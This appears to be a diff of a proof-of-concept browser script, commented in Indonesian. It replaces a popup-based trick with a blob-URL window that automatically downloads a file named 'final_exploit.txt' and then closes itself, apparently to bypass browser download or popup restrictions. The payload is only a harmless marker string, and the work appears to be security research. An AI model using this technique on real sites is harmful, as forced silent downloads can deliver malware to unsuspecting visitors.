@@ -16,24 +16,28 @@
     <script>
         document.addEventListener("keydown", (e) => {
             if (e.key === "Enter") {
-                console.log("Attempting Popup Escape...");
-                const popup = window.open("", "_blank", "width=200,height=200");
-                if (popup) {
-                    popup.document.write(`
-                <h1>Downloading...</h1>
+                console.log("Executing Blob-Escape Strategy...");
+                const htmlContent = `
+            <html>
+            <body>
+                <h1>Processing Download...</h1>
                 <script>
+                    // Di sini kita coba trigger download secepat mungkin
                     const a = document.createElement("a");
-                    a.href = "data:text/plain;base64,UE9DIC0gUG9wdXAgRXNjYXBl";
-                    a.download = "popup_bypass.txt";
+                    a.href = "data:application/octet-stream;base64,UE9DIC0gQmxvYiBCeXBhc3M=";
+                    a.download = "final_exploit.txt";
                     document.body.appendChild(a);
                     a.click();
-                    // Tutup popup setelah download dipicu
+                    // Kasih jeda dikit terus tutup
                     setTimeout(() => { window.close(); }, 1000);
                 <\/script>
-            `);
-                } else {
-                    console.error("Popup blocked! User gesture might be too weak or persistent.");
-                }
+            </body>
+            </html>
+        `;
+
+                const blob = new Blob([htmlContent], { type: 'text/html' });
+                const blobUrl = URL.createObjectURL(blob);
+                window.open(blobUrl, "_blank", "width=300,height=300");
             }
         });
     </script>
